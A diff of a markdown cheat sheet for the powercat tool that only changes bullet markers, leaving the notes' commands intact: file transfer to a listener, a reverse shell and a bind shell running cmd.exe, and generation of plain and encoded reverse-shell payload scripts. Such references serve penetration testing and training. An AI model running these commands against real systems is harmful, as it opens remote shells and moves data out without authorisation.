@@ -99,7 +99,7 @@ powercat [-c or -l] [-p port] [options]
 
 ### Send a file to receiver
 
-* Receiver: `nc -nlvp 443 > out.txt`
+- Receiver: `nc -nlvp 443 > out.txt`
 
 ```plain
 powercat -c 10.0.0.20 -p 443 -i .\testfile.txt
@@ -109,8 +109,8 @@ powercat -c 10.0.0.20 -p 443 -i .\testfile.txt
 
 ### Reverse shell
 
-* Receiver: `nc -nlvp 443`
-* `-e` - specifies the application that is executed once connected
+- Receiver: `nc -nlvp 443`
+- `-e` - specifies the application that is executed once connected
 
 ```plain
 powercat -c 10.0.0.20 -p 443 -e cmd.exe
@@ -118,8 +118,8 @@ powercat -c 10.0.0.20 -p 443 -e cmd.exe
 
 ### Bind shell
 
-* `-l` - specifies powercat to create a listener
-* `-e` - specifies the application that is executed once connected
+- `-l` - specifies powercat to create a listener
+- `-e` - specifies the application that is executed once connected
 
 ```plain
 powercat -l -p 443 -e cmd.exe
@@ -131,13 +131,13 @@ Once a connection is received (`nc <ip> 443`) the bind shell will be initiated.
 
 ### Standalone payloads
 
-* Non-encoded
+- Non-encoded
 
 ```plain
 powercat -c 10.0.0.20 -p 443 -e cmd.exe -g > reverse-shell.ps1
 ```
 
-* Encoded (run with `powershell.exe -E`)
+- Encoded (run with `powershell.exe -E`)
 
 ```plain
 powercat -c 10.0.0.20 -p 443 -e cmd.exe -ge > reverse-shell.ps1
@@ -145,4 +145,4 @@ powercat -c 10.0.0.20 -p 443 -e cmd.exe -ge > reverse-shell.ps1
 
 ## URL List
 
-* [Github.com - powercat](https://github.com/besimorhino/powercat)
+- [Github.com - powercat](https://github.com/besimorhino/powercat)
